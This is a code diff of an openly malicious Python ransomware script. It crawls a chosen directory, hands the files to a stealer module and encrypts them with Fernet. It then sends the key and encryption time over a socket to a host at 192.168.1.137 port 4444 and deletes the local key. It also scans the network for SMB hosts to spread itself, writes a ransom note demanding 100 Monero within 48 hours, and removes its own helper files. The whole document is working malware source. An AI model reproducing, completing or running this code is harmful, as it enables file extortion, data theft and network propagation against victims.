@@ -1,22 +1,23 @@
 # Author: SergioZ3R0
 #region Imports
 from time import sleep
-imports = ["subprocess", "sys", "os", "ctypes", "socket", "datetime", "time", "window", "cryptography", "ftplib", "telnetlib", "pywinrm", "pysmb"]
-#Install necessary modules
-def install(package): # Install the required package
+import subprocess
+import sys
+imports = ["cryptography", "tk", "telnetlib", "pywinrm", "pysmb"]
+
+# Install necessary modules
+def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
 for module in imports:
     install(module)
-#Import necessary modules
-import subprocess
-import sys
+
+# Import necessary modules
 import os
 import ctypes
 import socket
-from datetime import datetime, timedelta
+from datetime import datetime
 import time
-import window
 from cryptography.fernet import Fernet
 from ftplib import FTP
 import telnetlib
@@ -25,23 +26,23 @@ from smb.SMBConnection import SMBConnection
 import spread
 from stealer import stealer
 #endregion
+
 #region Definitions
-files = [] # List to store the files in the current directory
+files = []
+
 def recorrer_arbol_directorios(directory):
     global files
-    importantF=["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window.py", "stealer.py", "auto_run", "encryption_time.txt","README.md","auto_run.py","steal.zip"]
+    importantF = ["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window(no usage).py", "stealer.py", "auto_run", "encryption_time.txt","READMEPLS.txt" , "README.md", "auto_run.py", "steal.zip"]
     try:
         for file in os.listdir(directory):
             rute_element = os.path.join(directory, file)
             if not os.path.islink(rute_element):
                 if os.path.isdir(rute_element):
-                    # Ignora los directorios relacionados con Python
                     if "python" in rute_element.lower():
                         continue
                     print("Directory:", rute_element)
                     recorrer_arbol_directorios(rute_element)
                 else:
-                    # Ignora los archivos relacionados con Python
                     if file.endswith('.py') or file.endswith(".deb") or file.endswith(".exe") or file in importantF:
                         continue
                     print("File:", rute_element)
@@ -50,15 +51,15 @@ def recorrer_arbol_directorios(directory):
         pass
     print(files)
 
-def send_file_to_host(file_path, host, port): # Send the key file to the attacker
+def send_file_to_host(file_path, host, port):
     with open(file_path, 'rb') as file:
         data = file.read()
         print(file)
         print(data)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
-        s.connect((host, port)) # Connect to the attacker's server
-        s.sendall(data) # Send the file
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((host, port))
+        s.sendall(data)
 
 def unify_files(file1, file2, unified_file):
     with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
@@ -66,40 +67,34 @@ def unify_files(file1, file2, unified_file):
         uf.write('\n')
         uf.write(f2.read())
 #endregion
-#region Main
 
+#region Main
 recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))
 
-key = Fernet.generate_key() # Generate a key
+key = Fernet.generate_key()
 
-with open("key.key", "wb") as key_file: # Open the key file in write binary mode
-    key_file.write(key) # Write the key to the file
+with open("key.key", "wb") as key_file:
+    key_file.write(key)
 
 #region Stealer
 stealer(files)
 #endregion
 
-# Encrypt the files
 for file in files:
     try:
-        with open(file, "rb") as f: # Open the file in read binary mode
+        with open(file, "rb") as f:
             data = f.read()
-        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
+        data_encrypted = Fernet(key).encrypt(data)
         with open(file, "wb") as f:
-            f.write(data_encrypted) # Write the encrypted data to the file
+            f.write(data_encrypted)
     except Exception as e:
         print(f"Error encrypting file {file}: {e}")
 
-# Store the encryption time
 with open("encryption_time.txt", "w") as f:
     f.write(str(datetime.now()))
 
-
-
-# Usage unify_files
 unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')
 
-# Usage: send_file
 try:
     send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
     sleep(5)
@@ -107,15 +102,13 @@ try:
 except:
     pass
 
-
-#Delete the randsomware
 os.remove("key.key")
 os.remove("encryption_time.txt")
 os.remove("unified_file.txt")
+
 #region Spread
 network_prefix = "192.168.1"
 try:
-    # Call functions from spread module and execute specific functions
     open_smb_hosts = spread.scan_network_for_smb(network_prefix)
     for host in open_smb_hosts:
         spread.upload_script_to_smb(host, "./auto_run")
@@ -139,7 +132,13 @@ try:
 except Exception as e:
     print(f"Error spreading: {e}")
 #endregion
-window.Window()
+
+# Write the content of the window module to READMEPLS.txt
+with open("READMEPLS.txt", "w") as readme_file:
+    readme_file.write("Ransomware is a type of malicious software designed to block access to a computer system until a sum of money is paid. It typically spreads through phishing emails or by exploiting vulnerabilities in software. Once a system is infected, the ransomware encrypts files and demands a ransom to restore access.\n")
+    readme_file.write("To decrypt your files, pay 100 Monero (XMR) to my wallet (WALLET).\n")
+    readme_file.write("You have 48 hours to pay the ransom. After that, your files will be permanently deleted.\n")
+
 os.remove("auto_run.py")
 os.remove("stealer.py")
 os.remove("spread.py")
